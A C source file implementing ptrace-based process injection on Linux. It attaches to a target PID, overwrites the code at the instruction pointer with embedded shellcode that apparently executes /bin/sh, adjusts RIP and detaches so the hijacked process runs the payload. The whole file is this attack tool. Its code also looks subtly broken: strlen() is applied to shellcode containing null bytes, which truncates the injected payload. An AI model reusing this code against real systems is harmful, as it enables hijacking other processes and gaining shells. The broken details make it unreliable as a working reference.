#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/user.h>

unsigned char* sus = 
    "\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x00\xcc\x90\x90\x90"; 

// unsigned char* sus = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int inject(pid_t pid, unsigned char* src, void* dst, int size) {
    int i;
    uint32_t* s = (uint32_t*)src;
    uint32_t* d = (uint32_t*)dst;

    // The PTRACE_POKETEXT function works on words,
    // so we convert everything to word pointers (32bits) and we also increase i by 4.
    for (i = 0; i < size; i += 4, s++, d++) {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
            perror("ptrace(POKETEXT):");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char **argv) {
    pid_t pid;
    struct user_regs_struct reg;

    pid = atoi(argv[1]);

    printf("[+] Tracing...\n");

    if ((ptrace(PTRACE_ATTACH, pid)) < 0) {
        perror("[-] Error attaching\n");
        exit(1);
    }
    printf("[+] Finished attaching\n");

    printf("[+] Getting register\n");
    if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) < 0) {
        perror("[-] Error getting register\n");
        exit(1);
    }
    printf("[+] Finished getting register\n");

    // Injecting
    printf("[+] Injecting\n");
    if ((inject(pid, sus, (void*)reg.rip, strlen(sus))) != 0) {
        perror("[-] Error injecting\nExiting...\n");
        exit(1);
    }
    printf("[+] Injection completed\n");

    reg.rip += 2;
    printf("[+] Setting instruction pointer to %p\n", (void*)reg.rip);
    if ((ptrace(PTRACE_SETREGS, pid, NULL, &reg)) < 0) {
        perror("[-] Error setting register\n");
        exit(1);
    }
    printf("[+] Setting register completed\n");

    printf("[+] Running...\n");
    if ((ptrace(PTRACE_DETACH, pid, NULL, NULL)) < 0) {
        perror("[-] Error running\n");
        exit(1);
    }

    // (*(void(*)()) sus)();
    return 0;
}
